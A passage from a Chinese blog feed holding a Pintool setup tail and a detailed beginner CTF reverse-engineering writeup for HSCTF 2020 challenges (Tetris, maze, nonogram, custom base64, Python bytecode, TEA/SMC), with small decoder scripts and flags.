src="/p/toolsOf-Pintool/image-20201127203915433.png"></p><p>然后把终端cd到<code>pin-3.17-gcc-linux</code>下以后，输入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> <span class="built_in">source</span>/tools/ManualExamples</span><br><span class="line">make obj-intel64/inscount0.so</span><br><span class="line">make obj-ia32/inscount0.so TARGET=ia32</span><br></pre></td></tr></table></figure><p>可以在<code>pin-3.17-gcc-linux/source/tools/ManualExamples</code>目录下看到：</p><p><img src="/p/toolsOf-Pintool/image-20201127204220852.png"></p><p>build完成。</p><h1 id="修改配置"><a href="#修改配置" class="headerlink" title="修改配置"></a>修改配置</h1><p>回到<code>pintool-master</code>下，按README修改<code>pintool.py</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PIN = <span class="string">&quot;./pin-3.17-gcc-linux/pin&quot;</span></span><br><span class="line">INSCOUNT32 = <span class="string">&quot;./pin-3.17-gcc-linux/source/tools/ManualExamples/obj-ia32/inscount0.so&quot;</span></span><br><span class="line">INSCOUNT64 = <span class="string">&quot;./pin-3.17-gcc-linux/source/tools/ManualExamples/obj-intel64/inscount0.so&quot;</span></span><br></pre></td></tr></table></figure><p>然后就可以愉快地插桩啦~</p><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p>项目README里的帮助（mark一下）：</p><p><img src="/p/toolsOf-Pintool/image-20201127204616774.png"></p><p>日常使用的话就可以把二进制文件拖进<code>pintool-master</code>中，然后在此打开终端输入命令（如<code>python pintool.py -a 64 -c 1,2,3 -b &#123;_&#125; -l 25 -d &quot;=&gt; 300&quot; -s - vm</code>）即可。</p>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Reverse </tag>
            
            <tag> zero2one/入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【wp】2020HSCTF_PC逆向</title>
      <link href="p/wpFor-2020HSCTF/"/>
      <url>p/wpFor-2020HSCTF/</url>
      
        <content type="html"><![CDATA[<p>是HSCTF2020新生赛的PC逆向部分的wp，尽量往详细写啦，希望能给师傅们提供良好的复现体验。</p><p>本次Reverse基本都为送分题，旨在<strong>科普和引导</strong>逆向入门&#x3D;v&#x3D;</p><a id="more"></a><p>已经疯狂砍了很多难度啦，H4ve fuN w1th C7F_r3vEr5e!!</p><h1 id="0x01-Funny-game"><a href="#0x01-Funny-game" class="headerlink" title="0x01 Funny_game"></a>0x01 Funny_game</h1><p>多维度送分题（x） </p><p>显而易见的俄罗斯方块，打块拿flag。 </p><h2 id="Ⅰ-暴力打穿"><a href="#Ⅰ-暴力打穿" class="headerlink" title="Ⅰ. 暴力打穿"></a>Ⅰ. 暴力打穿</h2><p>打到2020分自行结束游戏后在屏幕右侧出flag。花个十几分钟大概就能出（</p><p><img src="/p/wpFor-2020HSCTF/image-20201021170028381.png"></p><p>p.s. 一定要在刚好2020分的时候结束游戏才能出flag哦，不然也没有flag出来的（所谓打得好不如打得巧</p><p><del>自己打出来的反面教材↓（。）</del></p><p><img src="/p/wpFor-2020HSCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20201016190008-1603270866167.png" alt=":/"></p><h2 id="Ⅱ-修改程序逻辑"><a href="#Ⅱ-修改程序逻辑" class="headerlink" title="Ⅱ. 修改程序逻辑"></a>Ⅱ. 修改程序逻辑</h2><p>在ida里按F5出伪代码，看到程序逻辑，</p><p><img src="/p/wpFor-2020HSCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20201015231356.png" alt=":/"></p><p>patch一下把if改成if not &#x2F; 2020改成0 &#x2F; …</p><p>（如果ida有装<a href="https://github.com/keystone-engine/keypatch">keypatch</a>这个插件的话就能直接通过更改汇编语句从而patch机器码；方法见-&gt;<a href="https://www.cnblogs.com/zhaijiahui/p/7978897.html">IDA7.0安装keypatch和findcrypt-yara插件</a>）</p><p><img src="/p/wpFor-2020HSCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20201015231617.png" alt=":/"><br>↑ ① 相当于把if改成if not</p><p><img src="/p/wpFor-2020HSCTF/2222.png" alt=":/"><br>↑ ② 把2020改成0</p><p>然后狂敲enter，1s拿flag。</p><p><img src="/p/wpFor-2020HSCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20201015230335.png" alt=":/"></p><h2 id="Ⅲ-定位到getflag-逆向求解"><a href="#Ⅲ-定位到getflag-逆向求解" class="headerlink" title="Ⅲ. 定位到getflag()逆向求解"></a>Ⅲ. 定位到getflag()逆向求解</h2><p>查看到程序逻辑以后双击getflag()，或者直接在函数栏搜索flag定位到关键函数。</p><p>getflag()程序逻辑：</p><p><img src="/p/wpFor-2020HSCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20201015234113.png" alt=":/"></p><p>逆向写出exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">arr=[<span class="number">0x0000006E</span>, <span class="number">0x00000094</span>, <span class="number">0x00000061</span>, <span class="number">0x0000006F</span>, <span class="number">0x0000009B</span>, <span class="number">0x00000071</span>, <span class="number">0x0000009D</span>, <span class="number">0x00000051</span>, <span class="number">0x0000009C</span>, <span class="number">0x0000006D</span>, <span class="number">0x00000067</span>, <span class="number">0x00000061</span>, <span class="number">0x00000067</span>, <span class="number">0x0000006E</span>, <span class="number">0x0000009D</span>, <span class="number">0x00000096</span>, <span class="number">0x00000096</span>, <span class="number">0x00000099</span>, <span class="number">0x00000067</span>, <span class="number">0x0000006F</span>, <span class="number">0x0000005C</span>, <span class="number">0x00000095</span>, <span class="number">0x0000006D</span>, <span class="number">0x00000067</span>, <span class="number">0x00000069</span>, <span class="number">0x00000093</span>, <span class="number">0x00000096</span>, <span class="number">0x0000007C</span>, <span class="number">0x00000067</span>, <span class="number">0x00000069</span>, <span class="number">0x0000009C</span>, <span class="number">0x00000085</span>]</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    tmp=(arr[i]^<span class="number">20</span>)<span class="number">-20</span></span><br><span class="line">    flag+=<span class="built_in">chr</span>(tmp)</span><br><span class="line">print(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag&#123;Qu1te_a_funny_g4me_isnT_it&#125;</span></span><br></pre></td></tr></table></figure><p>p.s. v1-v9在空间上是连续的，所以实际上这是一个长度为33（末尾有’\0’）的char型数组。</p><hr><h1 id="0x02-Magic-switch"><a href="#0x02-Magic-switch" class="headerlink" title="0x02 Magic_switch"></a>0x02 Magic_switch</h1><p>还是送分题（linux下可直接打开</p><h2 id="Ⅰ-随手乱糊"><a href="#Ⅰ-随手乱糊" class="headerlink" title="Ⅰ. 随手乱糊"></a>Ⅰ. 随手乱糊</h2><p>其实根据xor的特性，只要1-8每个数字都敲一次就能出flag（比如12345678）。当时出题的时候就在想会不会有队伍在wp里一脸懵逼地写“随便打就出来”的，没想到还真有哈哈哈。</p><p><img src="/p/wpFor-2020HSCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20201016002645.png" alt=":/"></p><h2 id="Ⅱ-修改程序逻辑-1"><a href="#Ⅱ-修改程序逻辑-1" class="headerlink" title="Ⅱ. 修改程序逻辑"></a>Ⅱ. 修改程序逻辑</h2><p>可以看到程序逻辑是只要所有灯的状态都是1的时候，才能跳出<code>while(1)</code>死循环。</p><p><img src="/p/wpFor-2020HSCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20201016003217.png" alt=":/"></p><p>同funny_game，可以通过修改程序逻辑，把<code>if(v6)</code>改成<code>if(!v6)</code>，然后程序运行时在while执行的第一次就能跳出循环获得flag，不过完全没必要（。<br>有patch的功夫不如直接乱糊2333。</p><h2 id="Ⅲ-定位到关键函数逆向求flag"><a href="#Ⅲ-定位到关键函数逆向求flag" class="headerlink" title="Ⅲ. 定位到关键函数逆向求flag"></a>Ⅲ. 定位到关键函数逆向求flag</h2><p>按惯例按快捷键<code>shift+F12</code>，查看strings窗口，可以看到一个fake_flag，顾名思义是假flag（这一段没什么用，目的只是提一下IDA的常规操作罢辽）。</p><p><img src="/p/wpFor-2020HSCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20201016004838.png" alt=":/"></p><p>点进flag以后发现flag不是直接存储的，而是在某个函数里生成(?)的。<br>进到反汇编窗口，右键flag数组，查询引用情况。</p><p><img src="/p/wpFor-2020HSCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20201016002432.png" alt=":/"></p><p>then可以看到一个神秘的secret函数。</p><p><img src="/p/wpFor-2020HSCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20201016002221.png" alt=":/"></p><p>secret()的函数逻辑如下。</p><p><img src="/p/wpFor-2020HSCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20201016004342.png" alt=":/"></p><p>在题目里，可以看到flag[]为全局变量（函数内没有声明&#x2F;存储在bss段&#x2F;在ida里显示变量名字），全局变量默认初始化为0。而任何数异或0都为它本身，故<code>flag[i]^=v2[i]</code>实际上等同于<code>flag[i]=v2[i]</code>。<br>一个简单xor，解密思路跟funny_game相同，写出exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">v2=[<span class="number">14</span>,<span class="number">16</span>,<span class="number">35</span>,<span class="number">28</span>,<span class="number">15</span>,<span class="number">42</span>,<span class="number">14</span>,<span class="number">16</span>,<span class="number">29</span>,<span class="number">60</span>,<span class="number">53</span>,<span class="number">12</span>,<span class="number">35</span>,<span class="number">46</span>,<span class="number">116</span>,<span class="number">15</span>,<span class="number">92</span>,<span class="number">56</span>,<span class="number">42</span>,<span class="number">19</span>,<span class="number">3</span>,<span class="number">20</span>,<span class="number">28</span>,<span class="number">37</span>,<span class="number">6</span>,<span class="number">19</span>,<span class="number">13</span>,<span class="number">20</span>,<span class="number">56</span>,<span class="number">6</span>,<span class="number">20</span>,<span class="number">27</span>,<span class="number">20</span>]</span><br><span class="line">fake_flag=<span class="string">&quot;Hahahahahahah_Th1s_is_a_f4ke_f1ag&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>):</span><br><span class="line">    tmp=v2[i]^<span class="built_in">ord</span>(fake_flag[i])^<span class="number">20</span></span><br><span class="line">    flag+=<span class="built_in">chr</span>(tmp)</span><br><span class="line">print(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Re_is_reaIIy_e4sy_and_int3rest1ng</span></span><br></pre></td></tr></table></figure><p>这也说明了xor其实只是基操并非考点，考点还是ida的操作和阅读C代码的能力&#x3D; &#x3D;</p><hr><h1 id="0x03-Not-A-Sudoku"><a href="#0x03-Not-A-Sudoku" class="headerlink" title="0x03 Not_A_Sudoku"></a>0x03 Not_A_Sudoku</h1><blockquote><p>Not A Sudoku，不是一个数独，不要看到81和sudo的数组名就想到数独啦（ </p><p><del>但跟数独也不是毫无关系的x。</del></p><p>这是一个神秘古老而冷门（误）的逻辑游戏，名为数织Nonograms <a href="https://cn.puzzle-nonograms.com/">【数织 - 在线解谜游戏】</a>（hint也给了这个网站的数独网址，往下翻一下更多解谜游戏就有），应用数织原理的手游也有Two Eyes、PicrossLUNA系列等。</p></blockquote><p>看到伪代码，知道程序逻辑是输入一个长度为81的二进制数字串，且需要通过<code>check(v4,0)</code>和<code>check(v4,1)</code>。</p><p><img src="/p/wpFor-2020HSCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20201016194543.png" alt=":/"></p><p>这里不能通过动态调试的方法获取flag，因为这里的flag其实是用户输入进去的，它只负责测试对不对。</p><p>也不能用angr，因为分支太多会爆内存。</p><p>所以我们只能通过静态分析<code>check()</code>函数来判断怎样的flag才能通过检查。</p><p><img src="/p/wpFor-2020HSCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20201016201729.png" alt=":/"></p><p>双击<code>C()</code>可以看到其功能是<code>return x==0? 1:9;</code>，本来还想科普一波三目运算符的没想到ida给简化了。</p><p>关于xor，有<code>0^1=1, 1^0=0</code>，即，将参数取反。（逆向科普有认真看的想必对这一条不会陌生！xor还有更多有趣的特性等待你们去挖掘~）</p><p>回到<code>check()</code>，a2&#x3D;0时的函数可以简化为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">9</span>*<span class="number">9</span>;i+=<span class="number">9</span>)&#123; <span class="comment">//i为行数</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">9</span>;j++)&#123; <span class="comment">//j为列数</span></span><br><span class="line">        <span class="keyword">if</span>(s[i+j]==<span class="string">&#x27;0&#x27;</span>) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">int</span> tmp=j;</span><br><span class="line">        <span class="keyword">while</span>(s[i+j]==<span class="string">&#x27;1&#x27;</span>&amp;&amp;j&lt;<span class="number">9</span>) j++;</span><br><span class="line">        <span class="keyword">if</span>(sudo[x][pos]!=(j-tmp)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">else</span> pos++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(sudo[x][pos]!=<span class="number">-1</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span> pos++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>于是就很容易可以看出，这是在检验一个9 * 9的图里<strong>每一行中</strong>有多少个连续的1块，每个1块里有多少个1。同理可得，<code>check(v4,1)</code>的作用是检验一个9 * 9的图里<strong>每一列中</strong>有多少个连续的1块，每个1块里有多少个1。这些数据都存放在<code>sudo[]</code>里，并以<code>-1</code>作为每一行&#x2F;列的界限。</p><p>这就是数织游戏的原理。</p><p>所以，我们可以画出这样的数织空图：</p><p><img src="/p/wpFor-2020HSCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20201016213510.png" alt=":/"></p><p>按照数织的玩法，我们填出下面的图（是一个很简单的9*9非常规数织，熟练的人很快就能填出来了）。</p><p><img src="/p/wpFor-2020HSCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20201016213959.png" alt=":/"></p><p><del>和尚玩家直呼眼熟（x）</del></p><p>填完以后，按照题目要求，把每一个格子的状态打下来就好了（有色为1，无色为0），然后能够得到flag：</p><p><code>flag&#123;001111000011111100110001110111111110111111111011111111000011110000001110000111100&#125;</code></p><hr><h1 id="0x04-Maze"><a href="#0x04-Maze" class="headerlink" title="0x04 Maze"></a>0x04 Maze</h1><p>其实这道题是出题的时候所有题里面最先有思路的一道，并且也花了点心思往里塞了很多科普（可惜写的时候忽略了防输入其他字符的default，不过还是做到就是赚到hhh。</p><p>如果认真看过CTF Wiki的人（或者攻防世界里reverse新手区刷完的人），看到这个题目应该有条件反射吧0v0</p><p><img src="/p/wpFor-2020HSCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20201016231846.png" alt=":/"></p><h2 id="那就直接maze套路走起吧"><a href="#那就直接maze套路走起吧" class="headerlink" title="那就直接maze套路走起吧"></a>那就直接maze套路走起吧</h2><p><img src="/p/wpFor-2020HSCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20201017010110.png" alt=":/"></p><h3 id="1）在内存中布置一张“地图”"><a href="#1）在内存中布置一张“地图”" class="headerlink" title="1）在内存中布置一张“地图”"></a>1）在内存中布置一张“地图”</h3><p>不同于常规的maze题目，本题的地图没有直接储存在全局变量中，而是由<code>CreateMap()</code>生成。</p><p><img src="/p/wpFor-2020HSCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20201017010424.png" alt=":/"></p><p>而这一串关键代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line">    <span class="built_in">map</span>[<span class="number">16</span> * i + <span class="number">16</span> - v1] = v2 &amp; <span class="number">1</span>;</span><br><span class="line">    v2 &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">    result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v1++;</span><br><span class="line">&#125;<span class="keyword">while</span> ( (_DWORD)result &amp;&amp; v1 &lt;= <span class="number">16</span> );</span><br></pre></td></tr></table></figure><p>其实跟十进制转二进制的代码特别像（论熟悉进制转换的必要性</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> num,pos=<span class="number">1</span>,binary[<span class="number">16</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;num;</span><br><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line">    binary[<span class="number">16</span>-pos]=num&amp;<span class="number">1</span>;</span><br><span class="line">    pos++;</span><br><span class="line">&#125;<span class="keyword">while</span>(num&gt;&gt;=<span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>所以其实就是把num数组里的数（先转成无符号数再）转成二进制按行存到地图里。</p><p>然后可以得到16*16的地图：</p><p><img src="/p/wpFor-2020HSCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20201017013145.png" alt=":/"></p><h3 id="2）将用户输入限制在少数几个字符范围内"><a href="#2）将用户输入限制在少数几个字符范围内" class="headerlink" title="2）将用户输入限制在少数几个字符范围内"></a>2）将用户输入限制在少数几个字符范围内</h3><p><img src="/p/wpFor-2020HSCTF/image-20201122204533636.png" alt=":/"></p><p>可以看到，除了格式<code>flag&#123;&#125;</code>以外，其余的字符都由<code>h</code>、<code>j</code>、<code>k</code>、<code>l</code>组成，表示在迷宫内的上下左右移动。</p><p>那么，为什么选这四个字母来作为上下左右而不是常规的<code>↑↓←→</code>或者<code>wasd</code>呢？</p><p>因为在文本编辑器vim里，让光标上下左右移动的快捷键分别就是<strong>h（左）、j（下）、k（上）、l（右）</strong>。（掌握vim快捷键是linux端快速敲码的第一步噢0v0</p><h3 id="3）一般只有一个迷宫入口和一个迷宫出口"><a href="#3）一般只有一个迷宫入口和一个迷宫出口" class="headerlink" title="3）一般只有一个迷宫入口和一个迷宫出口"></a>3）一般只有一个迷宫入口和一个迷宫出口</h3><p>在迷宫画出来后，可以轻松看到唯一的出入口（入口在map[13][0]、出口在map[13][15]）。因为有限制长度为59，所以很大可能是迷宫的最短路径。</p><p>在地图中用黄色标记表示（红色为混淆点）：</p><p><img src="/p/wpFor-2020HSCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20201017014734.png" alt=":/"></p><p>也可以很明显地看到，全部为0的格子连起来其实是一个Sloth的文字押 <del>（cy2谱面传统艺能，假装是音游元素）</del>。</p><p>跟着黄色路线一直走记下flag即可。</p><p><code>flag&#123;llllkkkhhhkkkkkkkkklllljjjjllljjljjjjjjjlllkkkklljjjl&#125;</code></p><hr><h1 id="0x05-Base64"><a href="#0x05-Base64" class="headerlink" title="0x05 Base64"></a>0x05 Base64</h1><p>这个名字，显然就是跟base64编码有密切联系呀&#x3D; &#x3D;</p><p>不知道的赶紧去看base64的简介和源码（pia飞。</p><p>某种程度来说也是一道送分题。</p><p><img src="/p/wpFor-2020HSCTF/image-20201021183307379.png"></p><p>函数名也这么明显了hhh，超级友好（当然如果函数名不明显的话也可以通过查看加密函数，发现跟base64源码差不多）。</p><p><img src="/p/wpFor-2020HSCTF/image-20201021183649136.png"></p><p>点进<code>base64_char</code>数组，能看到编码表，发现跟原版base64的表不同。</p><ul><li>本题：<code>abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/</code></li><li>原版编码：<code>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/</code></li></ul><p>所以是一个base64换表题，随便找一个在线网站利用已知密文<code>src</code>直接base64换表解密即可。</p><p><code>flag&#123;dedf73ea-7252-4892-b882-9992708f0f62&#125;</code></p><hr><h1 id="0x06-Bytecode"><a href="#0x06-Bytecode" class="headerlink" title="0x06 Bytecode"></a>0x06 Bytecode</h1><p>python字节码人工反编译，在网上能搜到很多死磕字节码的教程（比如hint给的 <a href="https://bbs.pediy.com/thread-246683.htm">死磕python字节码</a> 或者 <a href="https://www.cnblogs.com/yinguohai/archive/2004/01/13/11158492.html">python 字节码死磕</a>），最需要的是耐心hhhh。</p><p>然后可以逆出源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    flag=<span class="built_in">input</span>(<span class="string">&quot;No Flag No Entry &lt;(_^_)&gt;:\n&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(flag)==<span class="number">34</span> <span class="keyword">and</span> foo1(foo2(foo3(flag))):</span><br><span class="line">        print(<span class="string">&quot;\nAcc3pTed: You g0t iT! :D&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;\nErr0r: Unm4tched str1ng. :/&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo1</span>(<span class="params">s</span>):</span></span><br><span class="line">    arr=[<span class="number">51</span>, <span class="number">42</span>, <span class="number">67</span>, <span class="number">2</span>, <span class="number">100</span>, <span class="number">48</span>, <span class="number">94</span>, <span class="number">29</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">9</span>, <span class="number">43</span>, <span class="number">25</span>, <span class="number">21</span>, <span class="number">53</span>, <span class="number">11</span>, <span class="number">11</span>, <span class="number">91</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">19</span>, <span class="number">122</span>, <span class="number">0</span>, <span class="number">44</span>, <span class="number">26</span>, <span class="number">58</span>, <span class="number">26</span>, <span class="number">28</span>, <span class="number">24</span>, <span class="number">50</span>, <span class="number">3</span>, <span class="number">93</span>, <span class="number">21</span>]</span><br><span class="line">    <span class="keyword">if</span> s==arr:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo2</span>(<span class="params">s</span>):</span></span><br><span class="line">    arr1=<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">ord</span>,s))[::<span class="number">-1</span>]</span><br><span class="line">    arr2=[<span class="number">74</span>, <span class="number">117</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">84</span>, <span class="number">111</span>, <span class="number">111</span>, <span class="number">108</span>, <span class="number">109</span>, <span class="number">97</span>, <span class="number">110</span>] <span class="comment">#&quot;JustToolman&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(arr1)):</span><br><span class="line">        arr1[i]^=arr2[i%<span class="number">11</span>]</span><br><span class="line">    <span class="keyword">return</span> arr1</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo3</span>(<span class="params">s</span>):</span></span><br><span class="line">    a=<span class="number">1</span></span><br><span class="line">    b=<span class="number">-6</span></span><br><span class="line">    c=<span class="built_in">len</span>(s)<span class="number">-33</span></span><br><span class="line">    a=(a+<span class="number">2</span>*c)*<span class="number">3</span>+<span class="number">4</span>*c</span><br><span class="line">    b=b+<span class="number">2</span>*a+<span class="number">4</span>*c+c</span><br><span class="line">    <span class="keyword">return</span> s[b:a:<span class="number">-1</span>]+s[:b:<span class="number">-1</span>]+s[:a+<span class="number">1</span>]</span><br></pre></td></tr></table></figure><p>简单逆向，主要的点在字节码反编译部分，只要把源码逆出来就能写出脚本啦，刚好能帮助入门python。</p><p>就是切片那一块有一点点坑，注意是前到后不到的就好。</p><p><del>本来还有一层加密的，为了降低难度删掉了。</del></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">arr1=[<span class="number">51</span>, <span class="number">42</span>, <span class="number">67</span>, <span class="number">2</span>, <span class="number">100</span>, <span class="number">48</span>, <span class="number">94</span>, <span class="number">29</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">9</span>, <span class="number">43</span>, <span class="number">25</span>, <span class="number">21</span>, <span class="number">53</span>, <span class="number">11</span>, <span class="number">11</span>, <span class="number">91</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">19</span>, <span class="number">122</span>, <span class="number">0</span>, <span class="number">44</span>, <span class="number">26</span>, <span class="number">58</span>, <span class="number">26</span>, <span class="number">28</span>, <span class="number">24</span>, <span class="number">50</span>, <span class="number">3</span>, <span class="number">93</span>, <span class="number">21</span>]</span><br><span class="line">arr2=[<span class="number">74</span>, <span class="number">117</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">84</span>, <span class="number">111</span>, <span class="number">111</span>, <span class="number">108</span>, <span class="number">109</span>, <span class="number">97</span>, <span class="number">110</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(arr1)):</span><br><span class="line">    arr1[i]^=arr2[i%<span class="number">11</span>]</span><br><span class="line">arr1=<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">chr</span>,arr1))[::<span class="number">-1</span>]</span><br><span class="line">s=<span class="string">&#x27;&#x27;</span>.join(arr1)</span><br><span class="line">a=<span class="number">13</span></span><br><span class="line">b=<span class="number">25</span></span><br><span class="line">flag=s[-a<span class="number">-1</span>:]+s[b-a<span class="number">-1</span>::<span class="number">-1</span>]+s[-a<span class="number">-2</span>:b-a<span class="number">-1</span>:<span class="number">-1</span>]</span><br><span class="line">print(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag&#123;tq1_0v0_y0u_nnust_b3_A_d4lao&#125;</span></span><br></pre></td></tr></table></figure><hr><h1 id="0x07-Deliver-TEA-to-dalao"><a href="#0x07-Deliver-TEA-to-dalao" class="headerlink" title="0x07 Deliver_TEA_to_dalao"></a>0x07 Deliver_TEA_to_dalao</h1><p>其实名字有一点点暗示 <del>给大佬递茶.jpg</del> ，毕竟TEA这么明显的大写，在搜索引擎里能查到TEA加密；并且很明显的可以看到，在代码保护上运用了smc技术（热身赛有好好看wp的队肯定能发现）。</p><blockquote><p>SMC(self-Modifying  Code 自修改代码)，就是在真正执行某一段代码时，程序会对自身的该段代码进行自修改，只有在修改后的代码才是可汇编、可执行的。在程序未对该段代码进行修改之前，在静态分析状态下，均是不可读的字节码，IDA之类的反汇编器无法识别程序的正常逻辑。</p></blockquote><p>大概逻辑如图：</p><p><img src="/p/wpFor-2020HSCTF/image-20201021221658364.png"></p><h2 id="Ⅰ-通过patch伪修正"><a href="#Ⅰ-通过patch伪修正" class="headerlink" title="Ⅰ. 通过patch伪修正"></a>Ⅰ. 通过patch伪修正</h2><p>代码逻辑<del>看起来</del>比较简单，就是把输入的字符串v21经过一个加密函数以后跟已知字符串做对比而已。</p><p>然而看到加密函数的伪代码&amp;&amp;反汇编却发现乱七八糟的。</p><p><img src="/p/wpFor-2020HSCTF/image-20201021221743282.png"></p><p><img 